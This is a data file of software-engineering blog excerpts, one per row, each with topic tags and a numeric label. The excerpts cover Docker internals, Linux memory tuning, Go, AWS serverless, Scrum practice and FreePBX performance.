981,"In the context of product development, the improvement opportunity lies in generating valuable and actionable feedback from what doesnt work. Counterintuitively, that information is often crucial. If there is no feedback loop in place paying attention to this mechanism, the learning opportunity is lost. Perhaps the motto should be updated to something like Obviously it doesnt sound as catchy as Facebooks mantra. But dont be fooled into thinking that breaking stuff is inherently good. And it apparently doesnt apply in all contexts, as the XKCD comic illustrates.","['Software Development', 'Agile', 'Startup', 'Entrepreneurship', 'Product Management']",4
982,First of all we wasted some time debating (again) what functionality users may want or that we think is needed. This is something that always happens and regularly returns in product development. Take as an example AWS S3 Downloads. Were storing some data there and let users download it. Normally we would use signed URLs to do thisbut is it essential for Day 1?,"['Lean Startup', 'Product Management', 'Startup', 'Affiliate Marketing', 'Software Development']",11
983,The main issue with a key bit of functionality remains where we cant seem to solve this nasty bug in our code. Were not going to give in and remove it from scope right now. Spend one more day trying to fix that bit. Agree go live pricing plans Update Stripe and integrate required webhooks Join up Stripe with User accounts Integrate Maitre waitinglist webhooks with Intercom Implement key event tracking Fix or remove from scope the buggy functionality A quick update as im typing this on Day 6 and still have stuff to finish so that we dont need to work this weekend. (note to selfdont open that iphone7 box that just arrived)We tweaked our pricing. I was factoring in build cost spread over 6 months. Ive taken that out which enabled us to get down to better pricing levels.,"['Lean Startup', 'Product Management', 'Startup', 'Affiliate Marketing', 'Software Development']",6
984,"All they need to do is code. Resource consideration (deploy, configure, manage) is no longer their concern. The cloud migration companies takes care of that. The less you are meant to manage the instance, the more serverless it is. Serverless goes well with certain functions. It is for companies to learn optimizing their use and integrate them into broader data systems.","['AWS', 'Serverless Computing', 'AWS Lambda', 'Machine Learning', 'Microservices']",10
985,"Multiple AWS services need to be employed to attain our goal. Microservices will be written using Lambda. TO expose Lambda functions to the web, API Gateway will come in handy. IAM and Cognito will handle user authentication. Dynamo DB, database for storing newsletter subscriber info. You first need to set up Dynamo DB. You can learn more about Dynamo DB here.","['AWS', 'Serverless Computing', 'AWS Lambda', 'Machine Learning', 'Microservices']",11
986,"The difference is that in premortem you dont answer templated questions. You are trying to get into the mood, of a failure. The world is collapsing, What the hell have we done wrong? This is more of an imagination drill than an interrogation one.","['Technology', 'Software Development', 'Project Management', 'Quality Assurance', 'Agile']",4
987,"You can spice the above with your own creative ideas I love to hear about them! My recommendation is not to continue, but to halt the meeting. The goal of the meeting was achieved. The goal was to creatively think on what caused the project to fail.","['Technology', 'Software Development', 'Project Management', 'Quality Assurance', 'Agile']",4
988,"I was talking with one of my old buddies and while talking our discussion as always somehow started rounding around technologies. He was flaunting about his newly learned skills of making web APIs using __url__ and he was sounding so overconfident that while talking he said he can make a powerful website like Facebook within a week which can serve millions of users at a time. And yeah, did I tell you that he is a fresh developer who is into this development stuff for not more than a month or two! I was literally dumbstruck by his confidence which anyways I liked so I thought I should discuss his approach for making such a highly scalable API infrastructure which he was claiming to make, whether he is aware of making scalable architecture or not? because sometimes not knowing the real problem can pump us with lots of hollow confidence. So when I started discussing, how would he scale his website/API which could serve millions of users simultaneously, his answers were pretty simple. He said he will just buy a bigger server and will keep increasing the size of the server to match the performance for larger traffic. I was not very shocked with his answers keeping his experience in mind because once even I would think similar approaches for increasing performance. He was a new developer so to make him understand the real problem I did not want to scare him with some jargons and buzzing words so I thought for a while and somehow this analogy of cooking khichdi came into my mind. FYI Khichdi or khichri is a dish from the Indian subcontinent made from rice and lentils Our conversation went like Him: blah blah and blah and thats how I will serve a million users per seconds Me: Oh so thats how you are gonna serve millions of users. Sounds good but if you dont mind I wanna ask/discuss something nontechnical.","['Programming', 'Servers', 'Scalability']",19
989,"Now tell me how would you cook Khichdi for 10 guests in your home? Of course in a bigger container Me: Well, you seem to be a real genius dude. Could you tell, how would you cook the same Khichdi for 50 guests in your home? (He thought for a few seconds)Him: Maybe I will need 3 or 4 bigger Cooking Pots to cook Khichdi for these many people in my Kitchen. And also I may need a Sigdi which will be better to have 4 burners that will allow me to cook simultaneously in all the pots( Something like Multi-core processors isnt? I was thinking)Our discussion was going quite perfectly and we were heading in the right direction, I thought. Now just to make him understand the real problem, I made my final point.","['Programming', 'Servers', 'Scalability']",10
990,"Me: Your approach for every question seems to be a pretty perfect dude, you have really answered the way I expected from you. Now let me ask you one more question. Imagine that for some reason you have been given the responsibility to cook the same khichdi for fifty thousand people for a really big feast, how would you cook it for so many people at a time? This time he hesitated before answering anything instantly. Maybe he was imagining the resources needed to cook such a high quantity of food at a time. He was confused and was thinking of the practical approaches for the solution. Now he understood he cant just say that he will need a very huge container to cook the food for 50k people simultaneously because practically there is a limit for increasing the size of the same container. (After some 1520 seconds for thinking)Him: I might need Many big burners and many big containers located around each other. Each burner should be attached with a separate Fuel source Our discussion went ahead and gradually, he might have started getting where I was heading to, he seemed to have gotten my analogy of cooking khichdi is linking to making scalable infrastructure for APIs. My example of cooking Khichdi may not be 100% accurate with respect to designing server infrastructure and making APIs but up to a good extent, it makes the person understand some basic terminology. When I asked him about cooking khichdi for 50K people at a time, it was like asking to design a system which responses to 50K-QPS load per second. Whenever he said about increasing the size of Cooking Pot, he was unconsciously using vertical scaling in which specification of a server or its part is increased. (Like increasing the RAM from 16GB to 64GB), When I substantially increased the number of people to eat the food to 50K at a time, he might have understood that there is always a limit for vertical scaling and thats the reason why we need horizontal scaling. Whenever he was talking about increasing number of burners and an increasing number of cooking pots. it was actually like horizontal scaling in which numbers of servers are increased to serve the larger users traffic.","['Programming', 'Servers', 'Scalability']",4
991,"In the last few years, we have an exponential increase in the development and use of APIs. We are in the era of API-first companies like Stripe, Twilio, Mailgun etc. where the entire product or service is exposed via REST APIs. Web applications also today are powered by REST-based Web Services. APIs today encapsulate critical business logic with high SLAs. Hence it is important to test APIs as part of the continuous integration process to reduce errors, improve predictability and catch nasty bugs.","['Api Testing', 'Postman', 'Newman', 'Test Automation', 'Continuous Integration']",10
992,"Concurrency is one of the primary concerns in most of the server applications and it should be the primary concern of the language, considering the modern microprocessors. Go introduces a concept called a goroutine. A goroutine is analogous to a lightweight user-space thread. It is much more complicated than that in reality as several goroutines multiplex on a single thread but the above expression should give you a general idea. These are light enough that you can actually spin up a million goroutines simultaneously as they start with a very tiny stack. Any function/method in Go can be used to spawn a Goroutine. You can just do go my Async Task() to spawn a goroutine from my Async Task function. The following is an example: Yes, its that easy and it is meant to be that way as Go is a simple language and you are expected to spawn a goroutine for every independent async task without caring much. Gos runtime automatically takes care of running the goroutines in parallel if multiple cores are available. But how do these goroutines communicate?","['Golang', 'Protobuf', 'Grpc', 'Server Side Rendering', 'Microservices']",3
993,"These two primitives give a lot of flexibility and simplicity in writing asynchronous or parallel code. Other helper libraries like a goroutine pool can be easily created from the above primitives. One basic example is: Unlike a lot of other modern languages, Golang doesnt have a lot of features. In fact, a compelling case can be made for the language being too restrictive in its feature set and thats intended. It is not designed around a programming paradigm like Java or designed to support multiple programming paradigms like Python. Its just bare bones structural programming. Just the essential features are thrown into the language and not a single thing more.","['Golang', 'Protobuf', 'Grpc', 'Server Side Rendering', 'Microservices']",9
994,I dont see any equivalent for `go get`. You dont need to specify all your dependency in a single file. You can directly use: In your source file itself and when you do `go build` it will automatically `go get` it for you. You can see the full source file here: This binds the dependency declaration with the source itself.,"['Golang', 'Protobuf', 'Grpc', 'Server Side Rendering', 'Microservices']",18
995,Protobuf or Protocol Buffers is a binary communication format by Google. It is used to serialize structured data. Its more than 10 years old and Google has been using it for a while now.,"['Golang', 'Protobuf', 'Grpc', 'Server Side Rendering', 'Microservices']",3
996,"The biggest problem youll likely run into is running out of RAM on old hardware and low-end VPSs. You dont have the money to upgrade, or just dont want to. swapfile or swap partition) that Linux will use just as it uses RAM. Since disks are slower than RAM, this means that if important things are swapped out, your performance will suck. So, Linux tries to only put what isnt as important on swap. The important stuff stays in RAM, and that chrome window with 15 You Tube tabs you forgot about goes to swap, if the system needs more RAM. If you have tons of RAM, you should still have swap, but your system wont use it too much. This is not meant to be a replacement for enough RAM, but that didnt stop me, and many other people from trying.z Swap compresses the contents of swap, which can increase performance in some cases. I didnt really notice that much of a difference, but that doesnt mean it wont work for you. I think the general idea is that the less data has to be transferred to and from the disk, the better the performance will be. Its worth a try, so to enable it, simply follow this answer. If youre too lazy to click on a link, heres the important part: By the way, the GRUB config file is generally at /etc/default/grub. After updating this file, run update-grub as root(sudo).",['Ubuntu'],7
997,"If your system feels faster, great! If not, try the next option: z Ram. z Ram takes it a step farther from z Swap, and creates a compressed swap thingie in RAM. While having swap in RAM may seem counter-intuitive, it really isnt in this case. Because the swap is compressed, it allows you to squeeze a bit more out of the RAM you already have, at the expense of a bit more processing power. Another upside to doing this in RAM is that no disk space is lost, something that might also be scarce on a budget VPS. Enabling this is even easier than z Swap, simply run:and then:and check if swap has been added with the free command.",['Ubuntu'],3
998,"For those of you that dont know, the Linux kernels last defense against a full system crash is the OOM killer, a.k.a. Once all other options are exhausted, and there is no more RAM or swap space, the kernel kills the task with the highest OOM score. The score is a bit complicated, so I wont go into it now. The problem is that sometimes it can take forever before the OOM killer does something, and until it does, your system can be frozen and unusable. It runs in the background, and does pretty much the same thing as the OOM killer. The main difference is that it can be configured to run way before the OOM killer does, saving time. While you can manually install it, you can also use my script from my Script Git Hub repository. Anyways, to use it, just run the following: Then, enter the percentages when asked: Those are just example values, so feel free to change them. A good starting point is 10 for both, but I prefer a higher one for swap, because it can take quite a long time to fill up when the system begins swapping.",['Ubuntu'],3
999,"Luckily, unlike Windows, Ubuntu doesnt require reboots that often. You have to reboot even less when you enable live kernel patching. But, you will have to eventually reboot, and that can be slow, especially on a 5400 rpm hard drive, like my laptop has. Sure, you can use e4rat, or e4rat-lite, but that takes a lot of time to setup. The easier solution is kexec-tools, which can be installed with: This makes reboots much shorter by loading the new kernel, or the same one, without doing a full system reboot, which bypasses the BIOS, or UEFI, or whatever else you have. While this does not makes normal boot-ups faster, it does make the reboot process shorter, so theres no reason not to have it.",['Ubuntu'],18
1000,"CNAME records are used to point a domain or subdomain to another hostname. To achieve this, CNAMEs use the existing A record as their value. In its turn, an A record subsequently resolves to a specified IP address. Also, in Kubernetes, CNAME records can be used for cross-cluster service discovery with federated services. In this scenario, there is a common Service across multiple Kubernetes clusters. This service can be discovered by all pods no matter what cluster they are living on. Such an approach allows for cross-cluster service discovery, which is a big topic in its own right to be discussed in another tutorial.","['Kubernetes', 'DNS', 'Container Orchestration', 'Services', 'Containers']",11
1001,"by Aricka Flowers When our Co-founder and Engineering Fellow Dmitriy Zaporozhets decided to build Git Lab, he chose to do it with Ruby on Rails, despite working primarily in PHP at the time. Git Hub, a source of inspiration for Git Lab, was also based on Rails, making it a logical pick considering his interest in the framework. Git Lab CEO Sid Sijbrandij thinks his co-founder made a good choice: Its worked out really well because the Ruby on Rails ecosystem allows you to shape a lot of functionality at a high quality, he explained. If you look at Git Lab, it has an enormous amount of functionality. Software development is very complex and to help with that, we need a lot of functionality and Ruby on Rails is a way to do it. Because theres all these best practices that are on your happy path, its also a way to keep the code consistent when you ship something like Git Lab. Youre kind of guided into doing the right thing.","['Ruby on Rails', 'Software Development', 'Startup']",18
1002,"Ruby was optimized for the developer, not for running it in production, says Sid. For the things that get hit a lot and have to be very performant or that, for example, have to wait very long on a system IO, we rewrite those in Go We are still trying to make Git Lab use less memory. So, well need to enable multithreading. When we developed Git Lab that was not common in the Ruby on Rails ecosystem. Now its more common, but because we now have so much code and so many dependencies, its going to be a longer path for us to get there. That should help; it wont make it blazingly fast, but at least it will use less memory.","['Ruby on Rails', 'Software Development', 'Startup']",10
1003,"I was really encouraged when I opened the project and saw it for the first time a year after Dmitriy started it. I opened it up and its idiomatic Rails. He didnt try to experiment with some kind of fad that he was interested in. He made it into a production application. Dmitriy carefully vetted all the contributions to make sure they stick to those conventions, and thats still the case. I think we have a very nice codebase that allows other people to build on top of it. One of our sub-values is boring solutions: dont do anything fancy. This is so that others can build on top it. I think weve done that really well and were really thankful that Ruby has been such a stable, ecosystem for us to build on.","['Ruby on Rails', 'Software Development', 'Startup']",9
1004,"Introduction and Purpose: I took a deep dive into linux to try to understand my computer. It took a long time, and I had worked hard too. I worked my a** off to get arch installed on my laptop, which I still use to this day. I never thought I would be building up the most difficult part, in my opinion, of understanding how Docker works. I decided that I wanted to write this article because I could not believe how easy containers are to create, and that during my installation of arch linux, I had essentially done just that. If you have experience with linux and you are looking to work with kubernetes or docker swarm, but you cant say that you definitively understand what a container is. This article might be able to help you out. One thing I like to tell people that have just gotten started with containters that you are always in a container. Your computer is essentially a container. Its not even exactly unlimited either. Its limited by your hardware specification, and not only that, but most of the time your machine is limited to some extent by the machine. You tell each partition how much data it is allowed to use. These are just automatically set up for you, so you dont think about it when you are using your computer, so even when you dont think you are using a container you kinda are.","['Docker', 'Linux', 'System Administration', 'Containers', 'Kubernetes']",7
1005,"Docker: You may have heard people say docker is essentially a lightweight vm or you might hear them say its a basically the code and everything you need to run it. I dont like that thinking, and I will show you why. Have had the tools to work with containers for years. In fact, Docker isnt anything new. Ok thats great but still if you dont subscribe to light weight vm, what is Docker? Dockers website says, A Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, run time, system tools, system libraries and settings, but what does that mean? The first time I asked a senior developer to explain how docker works under the hood he said, Well, there is a hypervisor which is the operating system on the server, then you create an artificial root access that only allows you to see the operating system that you specified, all configuration options you need are set up, and then your code is ported over. At that point he had scared me, how would I ever be able to create ingenious code like that The coolest thing I had done up to that point was put my resume on Alexa. I plan to break up what that senior engineer was trying to tell me into a few simple and easy to understand concepts. Not only that, but I am going to rewrite Docker, part of it and just for the concept, in bash scripting so that we can get a better understanding of what a container is, and why I believe if you have ever installed Arch Linux and understood what you are doing, you should definitely understand how this works.","['Docker', 'Linux', 'System Administration', 'Containers', 'Kubernetes']",7
1006,"Control groups are pretty straight forward. Its the amount of resources you want someone to be able to control. It allows for resources to be shared and managed. This is pretty straight forward in Docker. You would use the -m ormemory= both of those are ways to limit how much ram you have access to. I am personally running arch linux. I have my resources managed by a file in /etc/security/limits.conf. You can control how much ram they get, their storage, their access to gpus and a ton more. I could write an entire other article that talks about just the beginner things you can do with cgroups. If you know where your cgroups files are, you can actually see docker create those.","['Docker', 'Linux', 'System Administration', 'Containers', 'Kubernetes']",7
1007,"So now we were able to limit how much resources someone has access to in your container, but I didnt really go into the bulk because there is too much. I just wanted to make you aware, so you can understand what is going on. Now, I want to talk about something a little bit different. If cgroups are what control what you can use, namespaces are what you can see. This is where you can control access to processes, mounts, networking and all sorts of other things basically everything you see. The idea is what you cant see, you cant access either. We mainly want to focus on processes and networking though. These are important because if you look at the processes on a container, they are different than the processes on your machines. That way you are only in control of the process on that container. You may be looking at everything I am saying, and you might start to think well we are managing all of these things Thats what my /dev does in my filesystem or thats what /mnt does. These are all essentially root level functions youre on to something, and I want to bring it all together.","['Docker', 'Linux', 'System Administration', 'Containers', 'Kubernetes']",11
1008,"Lets focus on processes for a __url__ I use the ps command. If I dont change the namespace to make it so that I cant see the host machines processes you might get something like this[lucas@krusty-krab pycker]$ ps PID TTY TIME CMD9837 pts/1 00:00:00 bash10978 pts/1 00:00:00 psroot@container:/# /bin/ps PID TTY TIME CMD10995? 00:00:00 ps Do you see how the processes are high in the container? Thats not what you would expect. You have to set a new namespace in order to fix this issue. You are also going to need to unmount the systems proc and mount it onto /proc on the file system you are using.root@container:/# /bin/ps PID TTY TIME CMD1? 00:00:00 ps# things got moved over because of Mediums space limitations. However you can see how this works and we are happy.chroot-when you are creating a docker container, you might notice that you have to specify a image. Now, you might see the whole connection. Chroot allows you to change the apparent root directory. So, if we use everything we have talked about until now, and we have a file system; we can control how much memory, storage, gpus and all sorts of other hardware options using cgroups; and, we can control what processes, mounts, and all sorts of networking using namespaces, and now we can change the apparent root to be any linux filesystem whether it be ubuntu, opensuse, redhat or otherwise using chroot. Doesnt that sound like a container. Now, I realize there are a lot of other things you can do, but the point is, its not magic. Its a lot of blood sweat and tears of some brilliant people who created an amazing tool to make it so that we dont have to fuss with cgroups, namespaces or chroot. We can let docker handle all of those details, and we can code.","['Docker', 'Linux', 'System Administration', 'Containers', 'Kubernetes']",7
1009,"Using chroot is pretty simple if you never have before. All you have to do is say:chroot /path/to/file/you/want/to/be/the/apparent/root Docker is an amazing tool. It can teach you so much more than you would think possible, and it will take the stress of worrying about all the things I just talked about and throw them out the window. It will show you that everything you learned in linux isnt a waste. I suggest every team start using Docker because it is truly remarkable.","['Docker', 'Linux', 'System Administration', 'Containers', 'Kubernetes']",7
1010,"Every so often, I host a bad movie night at my place. The movies selected are always terrible, but its fun to get folks together, and marvel at the horrendous garbage committed to film. At the last one (the dumpster fire known as Samurai Cop), I invited one of my former co-workers. For over a decade, we worked side-by-side in the corporate machine; he still works there today. After the movie ended, we talked about our days at the machine. He said he missed that I no longer worked there, adding how back then, he initially found my frequent complaints annoying. However, with me gone, he now found himself frustrated, prone to complaining, and without anyone to commiserate.","['Agile', 'Serious Scrum', 'Scrum', 'Scrum Master', 'Improvement']",0
1011,"Because of how my brain is wired, I tend to take time to process things, and think about them before expressing my opinions. After taking a few days to fully digesting his comments, it dawned on me. Calling out dysfunction came off as complaints because the organization had no intention of changing. Back when I worked there, one of my former bosses once told me that I had an impressive knack for spotting problems. Even today, I have a passion for identifying issues, but so that everyone is aware, and they can get fixed. I suppose its one of the reasons I enjoy being a Scrum Master (SM). Calling out those kinda things is part of the dance. But I realized that when organizations dont address problems, even though they know full well how much pain it causes, pointing them out sounds like complaining.","['Agile', 'Serious Scrum', 'Scrum', 'Scrum Master', 'Improvement']",4
1012,"People should be given the authority to enact real, meaningful change. When they feel undervalued, and that the powers-that-be dont give a sh*t about their opinions, frustration festers. My frustration manifested in the form of feeling like Id been hoodwinked. The organization said they wanted roll with Scrum, which I took at face value. Unfortunately, empiricism was never a priority, and as fellow Serious Scrum editor Paddy Corry called out, transparency is the first step to getting there.","['Agile', 'Serious Scrum', 'Scrum', 'Scrum Master', 'Improvement']",4
1013,"I lost count how many times I heard the dreaded phrase, Dont come to me with problems. But heres the thing if youre not careful, that line of thinking can be like wearing blinders. My response was always, Im coming to you because I dont have the answer. Im bringing it to your attention so everyone can work together to fix it. Faced with this attitude, how long before folks stop pointing out issues, and problems fly under the radar undetected? If I failed to mentioned it, Im an ASA certified sailor. A few years back, I fell in love with sailing. As such, if while out on a sailboat, the crew says, Captain, our feet are wet because the hull is leaking, a reasonable captain would acknowledge that nugget of information, and take the requisite steps to ensure the ship doesnt sink. The boat, everyone aboard, and everything on it are their responsibility. Good leaders, and organizations see the inherit value of problems brought to light. Sure, sometimes folks need to vent like a steam kettle releasing built-up pressure, but after filtering those out, complaints should be viewed as a call to action.","['Agile', 'Serious Scrum', 'Scrum', 'Scrum Master', 'Improvement']",4
1014,"Scrum Masters were never meant to be cogs in a machine. Ive said it before, but were spose to be a pain in the ass when it comes to business-as-usual. By design, one of Scrums purposes is to identify dysfunction. Rolling with the framework isnt supposed to be comfortable. When the alarm is soundedlike when someone complains about a problemits your job to take it in, do the hard work, and fix it. Im not gonna lie, and say its easy. But what are the benefits of perpetuating a culture where problems dont get resolved simply because theyre difficult? If all youve done is throw Scrum at a bunch of developers, insisting they stand in a room for 15 minutes every day, and tell folks to work in sprints, soon enough, youll be the one complaining, saying Scrum doesnt work.","['Agile', 'Serious Scrum', 'Scrum', 'Scrum Master', 'Improvement']",1
1015,"This is where being bold, and brave comes into play. Sure, it may come off as complaining, but when the dust settles, improvement is about making a difference. I truly believe its perfectly fine to complain, but it must be acknowledged, and purposeful action taken to bring about a resolution. Itd be nice if we learned from it too. Failing to spot problems, and call them out can easily lead to stagnation. Its because I give a damn, and why Ive got complaints for days.","['Agile', 'Serious Scrum', 'Scrum', 'Scrum Master', 'Improvement']",4
1016,"July 2017: Begin Project Duplo Aug. 2017: Launch new mobile site for percentage of logged-in users Sept. 2017: Ship new mobile site for logged-in users Jan. 2018: Launch new mobile site for percentage of logged-out users Feb. 2018: Ship new mobile site for logged-out users Part of the reason we were able to create and ship a full-featured rewrite in three months was thanks to our open-source UI library, Gestalt. At Pinterest, we use React 16 for all web development. Gestalts suite of components are built to encompass our design language, which makes it very easy to create consistently beautiful pages without worrying about CSS. We created a suite of mobile web-specific layout components for creating consistently spaced pages throughout the site. Full Width breaks out of the default boundaries of Page Container, which breaks out of the boundaries of a Fixed Header. This kind of compositional layout led to fast, bug-free UI development.","['Progressive Web App', 'React', 'JavaScript', 'Mobile', 'Web']",6
1017,"After one year, there are ~600 Javascript files in our mobile web codebase, and all it takes is one ill-chosen import to bloat your bundle. Its really hard to maintain performance! We share code extensively across subsites for *.pinterest.com, and so we have certain measures set up to ensure that mobile webs dependencies stay clean. First is a set of graphs reporting build sizes with alerts for when bundles exceed permitted growth rates. Second is a custom eslint rule that disallows importing from files and directories we know are dependency-heavy and will bloat the bundle. For example, mobile web cannot import from the desktop web codebase, but we have a directory of safe packages that can be shared across both. Theres still work to do, but were proud of where we are.","['Progressive Web App', 'React', 'JavaScript', 'Mobile', 'Web']",19
1018,"While the case study deals mostly with page load, we also cared deeply about a fast, native-like experience while browsing. The biggest driver of client-side performance was our normalized redux store which allows for near-instant route changes. By having a single source of truth for models, like a Pin or user, it makes it trivial to show the information you have while waiting for more to load. For example, if you browse a feed of Pins, we have information about each Pin. When you tap on one, it takes you to a detailed view. Because the Pin data is normalized, we can easily show the limited details we have from the feed view until the full details finish being fetched from the server. When you click on a user avatar, we show that users profile with the information we have while we fetch the full user details. If youre interested in the structure of our state or the flow of our actions, the redux devtools extension is enabled in production for our mobile web site.","['Progressive Web App', 'React', 'JavaScript', 'Mobile', 'Web']",6
1019,"And what kind of native experience would it be without a night mode? Head over to your user settings and try it out! Now for the part youve all been waiting for: the numbers. Weekly active users on mobile web have increased 103 percent year-over-year overall, with a 156 percent increase in Brazil and 312 percent increase in India. On the engagement side, session length increased by 296 percent, the number of Pins seen increased by 401 percent and people were 295 percent more likely to save a Pin to a board. Those are amazing in and of themselves, but the growth front is where things really shined. Logins increased by 370 percent and new signups increased by 843 percent year-over-year. Since we shipped the new experience, mobile web has become the top platform for new signups. And for fun, in less than 6 months since fully shipping, we already have 800 thousand weekly users using our PWA like a native app (from their homescreen).","['Progressive Web App', 'React', 'JavaScript', 'Mobile', 'Web']",6
1020,"Technical debt will accumulate as time goes along. At some point, technical debt becomes so much that teams will want to add technical stories to sprints. People start arguing that senior engineers should have equal footing with Product Owners about what goes into the backlog. We have so much technical debtwe need to treat it just like any other story and prioritise it into sprints! Before this post, I would almost always agree with the team.","['Agile', 'Scrum']",1
1021,"On the other hand, software developers are the driving creative force behind programs. Software developers are responsible for the entire development process. They are the ones who collaborate with the client to create a theoretical design. They then have computer programmers create the code needed to run the software properly. Computer programmers will test and fix problems together with software developers. Software developers provide project leadership and technical guidance along every stage of the software development lifecycle.","['Software Development', 'Software Engineer', 'Software Developer', 'Software Engineering']",12
1022,"This year, the event was probably the biggest in its history, with over two thousands attendees and 3 parallel tracks: Data, Machine Learning, Dev Tools & Ops. While its been a challenge trying to pick which talks to skip, I decided to fully dive into a single track the whole day, Dev Tools & Ops, and Im glad I did! First of all, I have to mention the amazing keynote which consisted of three talks. David Patterson, yes, the author of the famous Computer Architecture book some of you might have studied in college, kicked us off with a talk titled Golden Age for Computer Architecture where he took us through a 40-year history of computers in half an hour. While theres been a Moores Law slowdown in transistor density since the 80s, another domain, deep learning, has caused an exponential growth in machine learning. AI training has been at the forefront of compute demand at a much higher rate than Moores Law. Especially in the last 6 years, from Alex Net to Alpha Go Zero, theres been a 300,000x increase in compute power. The industry leaders in this domain are contributing to the current neural network architecture debate in quite different approaches. Google with TPU which has 1 core per chip and a large 2D multiplier, Nvidia with 80+ core GPUs with many threads, Microsoft with FPGAs, customizing hardware to applications, and Intel with 30+ cores CPUs. There also many startups with their own architecture bets and the marketplace will ultimately settle this debate which was one of the lessons of the last 50 years in computer architecture. Other takeaways were that software advances has and will continue to inspire architecture innovations and that raising the hardware/software interface enables architectural opportunities.","['Machine Learning', 'Artificial Intelligence', 'Scale', 'Testing', 'Testing Tools']",5
1023,"Most recently, theyve moved to a hybrid approach of Blackbox orchestration service combined with a graybox record/replay system (pictured above). The orchestration service simulates the production environment and is able to test both the rider and driver apps in the same tenancy without interfering with other A/B tests. This has the benefit of covering the missing issues around mobile networking and device types as well as preventing tests from getting stale. The tradeoff is that the failure surface is now larger because anything from mobile to backend can fail but they have increased tooling support to make tests more actionable. For example, the flaky tests are automatically disabled, theres a CLI that has the same setup as the CI machines, a test run visualizer provides simulator/device/network logs along with individual steps, and a trip simulator tool removes the need to have two apps to run simultaneously. As a result, theyre able to run more tests with higher levels of confidence and their developers are much happier! Now that we took a peek into how Uber optimizes their mobile testing at scale, the next talk by Evan Snyder completed the big picture by talking about how test device utilization is optimized at Facebook. With 2.2B MAU on Facebooks ecosystem, their apps need to be tested on various platforms including newer devices such as Oculus Rift and Oculus Go. A lot of time is wasted when running tests on real devices, though. Take for example running mobile tests: Before running tests, the emulator needs to be erased, booted, and the app is installed followed by the results being uploaded to a backend service, which causes more time to be spent in pre and post test-run phases than the running the tests themselves.","['Machine Learning', 'Artificial Intelligence', 'Scale', 'Testing', 'Testing Tools']",10
1024,"Lets try to interact with the container now. Run the following: This will print a directory list of the current directory, inside the container. To attach the terminal to the container run: This will give us a prompt inside the container. All the command sent here will run inside the container. To exit run We saw previously how to access a container through a shell. This allows us to perform operations like create and manipulate files. Although when well exit the container and run it again well discover that all the changes are gone. This is because Docker loads the container from an image built previously, and does not modify that image during the execution of the container itself.","['Docker', 'Containers', 'Dockerfiles', 'Docker Compose', 'Docker Image']",7
1025,"The __url__ file is responsible for orchestrating the 2 containers, set them up and create a shared network to allow them to communicate each other (Otherwise theyll be isolated).services: define a list of containers, the 1st nested item is the container label The container label. In the case of the database itll be used in the db path for the connection (mongodb://walk-through-db)image: the image the container will be based onvolumes: bind a volume or a local path to a container pathworking_dir: sets the default working directory, it is the same as WORKDIR in Dockerfileports: binds an host port to a container port. Unlike the Docker file this is a real bind, not just a declarationnetworks: define a list of networks that the current container can access to. The same network needs to be listed inside the top level networks array (see the end of the file). The name is arbitrary.depends_on: in this case the app does not have much sense without the database running. Depends_on assures that the db is started before the app container. Although, Mongo DB requires a bit of time to start, so its container will be marked as running before the database will be fully ready, eventually generating a connection error. A fix for that can be seen in the __url__ file: The above code is the only amendment I made to the standard express boilerplate. It allows the app to establish a connection to the mongo db through 30 attempts. The reason for this strategy has been mentioned in the docker-compose depends_on point.","['Docker', 'Containers', 'Dockerfiles', 'Docker Compose', 'Docker Image']",7
1026,"In the world of AGIs, there are two types of AGIs actively in use today in Asterisk: AGI() and Fast AGI(). Both have been in existence in Asterisk since around version 1.0. In the beginning days of Free PBX all it required was a LAMP stack; Linux, Asterisk, My SQL and PHP. To utilize Fast AGI at the time meant youd have to run a daemon that continually runs in the background listening on TCP port 4573. Additionally youd need to effectively load all AGIs into this server at run time. Back in 2007 this was a huge mountain to climb so instead the developers of Free PBX (then known as Asterisk Management Portal) decided to use regular AGI and so was born dialparties.agi, one of the first agi php scripts to be used in Free PBX. Standard AGI is the simplest, and most widely used form of AGI. Standard AGI scripts run on the local PBX and communicate with Asterisk through socket descriptors (namely STDIN and STDOUT). The standard AGI allows for usage of all AGI commands, and is what this article will be discussing.","['Programming', 'Freepbx', 'Asterisk']",10
1027,"After doing some initial investigations it was determined that dashboard was keeping data for over 90 days and continually reprocessing that data. So if there was data from a month ago, dashboard would take the data from a month ago and reprocess it every minute. This means youd be continually averaging the last three months, the last 12 weeks, and the last 90 days. As you can imagine there is no point in reprocessing data from the past because it never changes. Working through the code base we were able to tell the dashboard scheduler to only update and average our most current data groupings. This means that instead of processing data from months ago you are only processing the most recent hour, day, week and month. This results in a huge performance increase to the system and a huge decrease in the amount of SQL queries per second.","['Programming', 'Freepbx', 'Asterisk']",8
1028,"But there were more steps we knew we could make. Starting in Framework 14.0.7.3 and Framework 15.0.6.2 the Key Value Store now implements in-memory caching. This means that multiple calls to the same key data will not make multiple calls to the database. This will create huge performance gains in code that calls the same key more than once but does not cache it locally, decreasing the amount of SQL Select calls that need to be made. Additionally, this also has the result of speeding up Key Value methods that attempt to get data in other ways, such as getting all the keys for a single module. Since the values are loaded from My SQL at first query then the keys are already in memory.","['Programming', 'Freepbx', 'Asterisk']",8
1029,"The front end / user interface is built in Type Script / Java Script on top of the Preact library. With that we have a fast and very small (3kb) alternative to React, with (nearly) the same API. I wrote about that in my other articles. Anyway, I would describe it as a superset of Java Script with a layer of types on top of it. It is also part of the repository, even though the code will probably not get the best grades.","['Ethereum', 'Solidity', 'Software Development', 'JavaScript', 'Smart Contracts']",19
1030,"Lets say youre working on a Twitter clone, and youd like posts to only be created by the logged in author. You allow the user_id to be passed into your API endpoint. You might write a permission like this: Looks good, but unfortunately, theres a gaping bug. We want to catch unauthorized users attempting to create tweets for others, but the way its currently written, this permission will let them breeze right through. Its because at the time of creation, there is no obj yet, and therefore, the has_object_permission method doesnt get called. If we wanted to gate-keep authoring new tweets, wed have to write a permission that looked like this: In a real program, youd probably catch this sort of gotcha with a thorough unit test or by setting the author to the user associated with the request instead of accepting a user_id for the author.","['Django', 'Python', 'Code Review', 'Best Practices', 'Security']",15
